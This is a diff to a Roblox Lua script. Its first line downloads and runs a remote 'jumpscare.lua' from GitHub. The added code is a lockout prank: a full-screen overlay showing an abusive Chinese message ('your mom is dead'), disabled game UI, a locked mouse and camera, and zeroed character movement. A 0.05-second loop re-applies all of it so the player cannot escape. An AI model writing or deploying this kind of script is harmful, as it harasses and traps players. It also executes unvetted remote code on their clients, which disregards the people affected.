@@ -1,1 +1,137 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+
+
+
+--  Services
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+--  Local Player
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+--  UI Elements
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LockScreen"
+ScreenGui.Parent = PlayerGui
+ScreenGui.IgnoreGuiInset = true -- 忽略屏幕边缘 inset
+
+--  Full Screen Mask
+local Mask = Instance.new("Frame")
+Mask.Size = UDim2.new(1, 0, 1, 0)
+Mask.BackgroundColor3 = Color3.new(0, 0, 0)
+Mask.BackgroundTransparency = 0.7
+Mask.ZIndex = 1000 -- 确保在最上层
+Mask.Parent = ScreenGui
+
+--  "sz" Text
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Size = UDim2.new(1, 0, 1, 0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "你妈死了！！！！！！"
+TextLabel.TextColor3 = Color3.new(1, 0, 0)
+TextLabel.TextSize = 200
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+TextLabel.TextStrokeTransparency = 0.3
+TextLabel.TextXAlignment = Enum.TextXAlignment.Center
+TextLabel.TextYAlignment = Enum.TextYAlignment.Center
+TextLabel.ZIndex = 1001
+TextLabel.Parent = ScreenGui
+
+--  Disable CoreGui Elements (Roblox 自带 UI)
+local function disableCoreGui()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+end
+
+--  Block All Input
+local function blockInput()
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if not gameProcessed then
+            return true
+        end
+    end)
+
+    UserInputService.InputEnded:Connect(function(input, gameProcessed)
+        if not gameProcessed then
+            return true
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input, gameProcessed)
+        if not gameProcessed then
+            return true
+        end
+    end)
+end
+
+--  Lock Mouse
+local function lockMouse()
+    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+    UserInputService.MouseIconEnabled = false
+end
+
+--  Lock Camera
+local function lockCamera()
+    local camera = workspace.CurrentCamera
+    if camera then
+        camera.CameraType = Enum.CameraType.Scriptable
+        camera.CFrame = CFrame.new(Vector3.new(0, 50, 0), Vector3.new(0, 0, 0)) -- 固定视角
+    end
+end
+
+--  Prevent UI Deletion
+local function protectUI()
+    while true do
+        wait(0.05)
+
+        --  Re-parent UI if deleted
+        if not ScreenGui.Parent then
+            ScreenGui.Parent = PlayerGui
+        end
+
+        if not Mask.Parent then
+            Mask.Parent = ScreenGui
+        end
+
+        if not TextLabel.Parent then
+            TextLabel.Parent = ScreenGui
+        end
+
+        --  Re-disable CoreGui
+        disableCoreGui()
+
+        --  Re-lock mouse
+        lockMouse()
+
+        --  Re-lock camera
+        lockCamera()
+    end
+end
+
+--  Initialize
+disableCoreGui()
+blockInput()
+lockMouse()
+lockCamera()
+
+--  Start protection loop
+coroutine.wrap(protectUI)()
+
+--  Extra: Disable character movement
+if LocalPlayer.Character then
+    local humanoid = LocalPlayer.Character:WaitForChild("Humanoid")
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+end
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+end)
